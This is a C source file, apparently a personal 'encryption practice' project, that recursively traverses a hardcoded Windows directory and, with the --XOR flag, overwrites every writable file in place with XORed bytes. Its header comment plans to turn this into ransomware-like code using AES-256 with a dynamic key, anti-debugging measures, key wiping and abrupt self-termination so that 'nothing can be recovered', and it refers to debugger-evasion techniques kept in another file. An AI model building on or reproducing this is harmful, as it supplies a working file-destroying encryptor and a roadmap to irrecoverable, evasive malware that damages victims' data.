/* 

* Author: Ezra Fast (allegedly) / the internet; Date: August 2, 2023;
* Description: This will traverse the given directory recursively and, when used with the --xor option, will xor the contents of all files in directory and sub-directory to the console.

* August 16 update: the code can successfully traverse the hardcoded directory and based on the option given, perform one of the following:
	- no option: traverse and print directory and file names with indentation
	- --dump: traverse the directory and if a file is encountered, dump all bytes to console in readable format (the file is opened in binary)
	- --XOR: (must be capitalized) traverse the hard coded base directory and, if a file is writable, XOR all bytes with the hardcoded key. This function should be changed
	to implement AES-256 with the symmetric key being XORed in between file operations, along with anti-debugging procedure calls. Once the directory has been traversed, all keys
	must be wiped from resident memory, and the process should abruptly terminate itself so that nothing can be recovered.

* From Here: implement AES-256 as described above. generate the key dynamically, do not hard-code the key. Upon encryption, wipe the key from memory and abrupty kill the process.

* To evade detection from debuggers in the event this code becomes malicious, there are starting points for these techniques in the file CRE.c

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <io.h>						// _access(filename, permissions) is used to see if files and directories are writable; if they are not, they are passed over.

void print_help_routine(char * arguments);
void solicit_dirname_procedure(char directory_base_path[], int arr_size);
int operate_on_file_contents(const char *path, int arg_flag);
void traverse(char * base_path, int indentation, int arg_flag);
void check_validity_of_directory(char * directory_base_path);
int arg_processor(char * arg);
void byte_transformer(FILE * file, const char* path);
int is_file_writable(const char* filename);

int main(int argc, char *argv[]) {

	print_help_routine(argv[1]);

	int arg_flag = arg_processor(argv[1]);		// return will be 2 for dump, 1 for xor, 0 for no arg

	char directory_base_path[200];
	int arr_size_96 = sizeof(directory_base_path);

	strcpy(directory_base_path, "C:\\Users\\efast\\OneDrive - Calgary Stampede\\Documents\\personal\\encryption_practice\\dirtest");
	
	// solicit_dirname_procedure(&directory_base_path[0], arr_size_96);

	printf("\n");

	check_validity_of_directory(directory_base_path);

	printf("Traversing: %s\n\n", directory_base_path);
	
	traverse(directory_base_path, 0, arg_flag);	

	printf("\n");
	return 0;
}

void solicit_dirname_procedure(char directory_base_path[], int arr_size) {				// This function needs to be tested
	printf("Enter the directory path: ");
	fgets(directory_base_path, arr_size, stdin);
	directory_base_path[strcspn(directory_base_path, "\n")] = '\0';		// cracked way of removing character at end of line
}

void check_validity_of_directory(char * directory_base_path) {
	if (opendir(directory_base_path) == NULL) {
		printf("Invalid Path Given\n");
		exit(-1);
	}
}

void traverse(char * base_path, int indentation, int arg_flag) {
	
	char path[1000];
	struct dirent * dp;
	DIR * dir = opendir(base_path);
	
	if (dir == NULL) {
		return;
	}
	
	while ((dp = readdir(dir)) != NULL) {
		if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
			
			for (int i = 0; i < indentation; i++) {
				printf("- - - ");
			}
			
			printf("%s\n", dp->d_name);
			
			// New path from base path
			strcpy(path, base_path);
			strcat(path, "\\");
			strcat(path, dp->d_name);
			
			if (arg_flag) {			// if arg_flag is either value
				printf("\n");
				operate_on_file_contents(path, arg_flag);
			}

			traverse(path, indentation + 1, arg_flag);
		}
	}
	closedir(dir);
}

int operate_on_file_contents(const char *path, int arg_flag) {
	struct stat path_stat;

	if (stat(path, &path_stat) != 0) {
		perror("Error getting file/directory information\n");
		return -1;
	}

	if (S_ISDIR(path_stat.st_mode)) {
		printf("Directory encountered.\n\n");
		return -1;
	} 
	else if (S_ISREG(path_stat.st_mode)) {
		if (is_file_writable(path) == 1) {
			FILE * file = fopen(path, "rb+");
			
			if (file == NULL) {
				perror("Error opening file\n");
				return -1;
			}
		
			
			if (arg_flag == 2) {
				printf("---------- BEGINNING OF CONTENT ----------\n\n");
			}
			
			unsigned char current_byte;
			
			if (arg_flag == 1) {																// 1 is for --XOR
				// printf("HERE\n");															// uncomment this to troubleshoot, curse my morning
				byte_transformer(file, path);
			} else if (arg_flag == 2) {															// 2 is for --dump
				while (fread(&current_byte, sizeof(current_byte), 1, file) == 1) {				// This is the loop that reads from and to the current file
					printf("%c", current_byte);													// This dumps file content one byte at a time
				}
			}
			
			fclose(file);

			if (arg_flag == 2) {printf("\n\n---------- END OF CONTENT ----------\n\n");}
			
			return 1;
		}
	}
	else {
		printf("The provided path is neither a file nor a directory.\n");
		return -1;
	}
}

int arg_processor(char * arg) {			// call this on argv[1] --> return will be 2 for dump, 1 for xor, 0 for no arg
	int arg_flag;
	if (arg) {
		if (strcmp(arg, "--dump") == 0) {
			return 2;
		} else if (strcmp(arg, "--XOR") == 0) {
			return 1;
		}
	} else {
		return 0;
	}
}

void byte_transformer(FILE * file, const char* path) {
	int byte;

	while ((byte = fgetc(file)) != EOF) {
		byte ^= 12;
		fseek(file, -1, SEEK_CUR);
		fputc(byte, file);
		fseek(file, 0, SEEK_CUR);
	}
}

void print_help_routine(char * arguments) {
	if (arguments == NULL) {
		return;
	}
	if (strcmp(arguments, "--help") == 0) {
		printf("usage: .\\traverse_directories_in_c.exe [--dump] [--xor]");
		exit(0);
	}
	else {return;}
}

int is_file_writable(const char* filename) {					// 1 for writable, 0 for not writable

    if (_access(filename, 02) == 0) {               // 00 is for existence, 02 is for write permissions, 04 is for read permissions, and 06 is for both read and write permissions
        // printf("File is writable\n");               // docs: https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/access-waccess?view=msvc-170
		return 1;
    } else {
        // printf("File is not writable\n");
		return 0;
	}

    return 0;
}